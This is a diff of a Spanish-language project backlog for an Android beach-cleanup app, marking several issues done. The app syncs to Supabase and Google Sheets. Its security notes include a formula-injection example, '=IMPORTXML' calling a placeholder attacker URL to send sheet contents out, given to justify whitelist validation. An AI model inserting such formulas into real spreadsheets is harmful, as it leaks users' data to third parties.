@@ -241,7 +241,7 @@
   - [x] Identificador público `applicationId = "dejatuplayalimpia.app"` (31-10-2026; el `namespace` del código sigue `cl.logisticaverde.app`). ⚠️ Se instala como app nueva: desinstalar la versión anterior en los teléfonos de prueba.
   - [x] Ícono de la app = logo (ícono adaptativo `mipmap-anydpi/ic_launcher`, logo en la zona segura sobre fondo blanco).
   - [ ] Keystore de firma: contraseña y respaldo **por definir** (no se sube a git).
-  - [ ] Quitar `org.gradle.java.home` de `gradle.properties` (moverlo a `~/.gradle/gradle.properties`).
+  - [x] Quitar `org.gradle.java.home` de `gradle.properties` (movido a `~/.gradle/gradle.properties`, 14-11-2026).
   - [x] ~~Sincronizar las jornadas pendientes antes de instalar la v3~~ — descartado: los datos de prueba se pueden perder (la migración a v3 los borra).
   - [x] Ejecutar `supabase_schema.sql` (v4) y la verificación manual de ISSUE-20 (07-11-2026).
   - [x] Configurar Script Properties en Sheets (`SUPABASE_URL`, `SUPABASE_SECRET_KEY`) y ejecutar `crearEstructura()`, `sincronizar()` e `instalarSincronizacionDiaria()` (ISSUE-27).
@@ -316,10 +316,11 @@
   - [x] Validaciones y guardado en Room sin cambios; errores bajo cada campo (56 tests en verde).
   - [x] Verificado en emulador (1080×2400): líder, voluntario con globo y lista, playa, Siguiente habilitado, teclado abierto.
 
-### `[ISSUE-45]` 🛠️ Botón de desarrollo "Eliminar jornada en curso" en la P1 — **quitar antes del piloto**
+### `[ISSUE-45]` ✅ 🛠️ Botón de desarrollo "Eliminar jornada en curso" en la P1 — **quitar antes del piloto**
 > **Decisiones del 07-11-2026:** basurero rojo arriba a la derecha de la P1, visible solo con una jornada en curso y en **todas** las variantes (debug y release), porque se usa desde el celular. Pide confirmación con un diálogo que explica qué se borra.
 * Borra del teléfono la jornada `EN_CURSO` (participantes, herramientas y basura en cascada) y sus fotos locales, y detiene el GPS. No toca jornadas cerradas, catálogos ni Supabase.
 * ⚠️ **Riesgo:** mientras exista, un líder podría borrar una jornada real. Antes de ISSUE-29 (piloto) se quita o se deja solo en `debug` (`BuildConfig.DEBUG`).
+* ✅ **14-11-2026:** quitado por completo (botón, diálogo, `eliminarJornadaEnCurso` y `deleteJornadaEnCurso`).
 
 ### `[ISSUE-46]` ✅ Rediseño UI: Pantalla 3 "Seleccionar sector a limpiar" · 0,5 d
 > **Decisiones del 07-11-2026** (según la imagen de diseño, con la paleta y Nunito actuales; solo visual):
@@ -334,9 +335,10 @@
   - [x] Test de `nombreSectorVisible` (quita solo la superficie final).
   - [x] Verificado en emulador: selección múltiple, ilustración, omitir con motivo.
 
-### `[ISSUE-47]` 📝 Nombres de sector sin la superficie en el catálogo — mejora futura
+### `[ISSUE-47]` ✅ Nombres de sector sin la superficie en el catálogo
 * **Hallazgo (07-11-2026, ISSUE-46):** `sector_catalogo.nombre_sector` trae la superficie pegada (`"Sector 1 - Norte (2.000 m²)"`), duplicando `area_m2`. Hoy la app la quita solo al mostrarla (`nombreSectorVisible`).
 * **Propuesta:** dejar el nombre limpio en Supabase, `CatalogoSeedData` y `supabase_schema.sql`, y usar siempre `area_m2` como dato. Sirve para calcular datos (m² limpiados, densidad, KPIs de ISSUE-30) y para reportes sin texto duplicado ni inconsistente si cambia la superficie.
+* ✅ **14-11-2026:** nombres limpios en `CatalogoSeedData` y en la semilla de `supabase_schema.sql`; se quita `nombreSectorVisible` (y su test). En Supabase se aplica con un `UPDATE` de `sector_catalogo`; el teléfono toma el nombre nuevo al descargar los catálogos.
 * Coordinar con el administrador; las jornadas ya hechas guardan el id del sector, así que no se ven afectadas.
 
 ### `[ISSUE-48]` ✅ Rediseño UI: Pantalla 4 "Herramientas de la brigada" · 0,5 d
@@ -532,7 +534,7 @@
 * **Hallazgo:** la clave publicable se extrae del APK en minutos. Con ella cualquiera puede: (a) enviar jornadas falsas por la RPC (altera los KPIs); (b) marcar herramientas como "Extraviado"/"Dañado" (ISSUE-39); (c) subir archivos de hasta 5 MB al bucket **público**: `allowed_mime_types` solo revisa el encabezado `Content-Type`, no el contenido, así que se podría alojar contenido arbitrario servido desde el proyecto.
 * **Mitigación:** de fondo, ISSUE-38 (cuenta por teléfono; quitar `EXECUTE` y el `INSERT` del bucket a `anon`). Mientras tanto: repartir el APK solo a brigadas de confianza y revisar límites de tasa en el panel de Supabase.
 
-### `[ISSUE-58]` 🔴 Inyección (parte RPC y app ✅; falta el conector) de fórmulas en Google Sheets — latente, corregir antes de ISSUE-27
+### `[ISSUE-58]` ✅ 🔴 Inyección de fórmulas en Google Sheets — latente, corregir antes de ISSUE-27
 * **Hallazgo:** el conector actual no funciona (lee `vista_reporte_jornadas`, que ya no existe, con la clave pública), pero cuando se rehaga y copie nombres, motivos de omisión, encargado de pesaje o N° de guía con `setValues()`, un texto que empiece con `=` se ejecutará como fórmula. Ej.: un "voluntario" `=IMPORTXML("https://atacante…?"&A1:Z99)` enviaría el contenido de la planilla a un tercero. Con ISSUE-57 cualquiera puede inyectar ese texto.
 > **Decisiones del 13-11-2026:** en vez de vetar solo los símbolos iniciales, cada campo de texto libre acepta **solo sus caracteres permitidos** (lista blanca), con el mismo criterio en la app (error bajo el campo, no deja avanzar), en `ValidadorJornada` y en la RPC:
 > - **Nombres** (líder, voluntarios, encargado de pesaje): letras (con tildes, ñ, ü), espacios y apóstrofo; empieza con letra; máx. 80.
@@ -540,7 +542,7 @@
 > - **N° de guía de despacho:** letras, números y guion; empieza con letra o número; 1 a 12 caracteres (ver ISSUE-60).
 * **Criterios de aceptación:**
   - [x] RPC, `ValidadorJornada` y campos de la app con la misma lista blanca por campo.
-  - [ ] Conector (ISSUE-27): anteponer `'` a todo texto antes de `setValues()`.
+  - [x] Conector (ISSUE-27): anteponer `'` a todo texto antes de `setValues()`.
 
 ### `[ISSUE-59]` ✅ 🟠 ID de jornada corto: fotos públicas adivinables y suplantación de jornadas
 * **Hallazgo:** el sufijo del ID son 6 caracteres hexadecimales de un UUID (`JornadaFlujoViewModel.kt`, `UUID.randomUUID().toString().take(6)`): ~16,7 millones de combinaciones por día. Las fotos (pueden mostrar caras, Ley 21.719 — ISSUE-40) son públicas en `…/REG-AAAAMMDD-XXXXXX_{1|2|3}_{tipo}.jpg`. Riesgos: (a) recorrer URLs por fuerza bruta; (b) **adelantarse a una jornada real**: si alguien sube antes una jornada o una foto con ese ID, la real recibe `YA_EXISTIA` / "ya existe", se marca sincronizada y sus datos se pierden en silencio.
@@ -562,7 +564,7 @@
 * La RPC responde `YA_EXISTIA`: permite saber si un ID existe (no revela sus datos).
 * Las fotos y los datos (nombres, GPS) quedan en el teléfono después de sincronizar; protegidos por el sandbox de Android, pero nunca se borran. Evaluar borrar las fotos locales tras subirlas.
 * `SECURITY DEFINER` con `search_path = public`; lo recomendado es `pg_catalog, public` (riesgo mínimo: `anon` no puede crear objetos).
-* Informativo: `gradle.properties` incluye una ruta con el nombre de usuario (ya en ISSUE-28); `proguard-rules.pro` apunta a un paquete inexistente (`data.remote.dto`): si se activa la minificación, la sincronización con Gson fallaría.
+* Informativo: `gradle.properties` incluye una ruta con el nombre de usuario (ya en ISSUE-28); ~~`proguard-rules.pro` apunta a un paquete inexistente (`data.remote.dto`)~~ ✅ 14-11-2026: conserva `data.remote` y `data.local.entity` (Gson) y los atributos `Signature`/anotaciones.
 
 ## 🧱 Épica 11: Modelo de datos v5 (análisis del 13-11-2026)
 
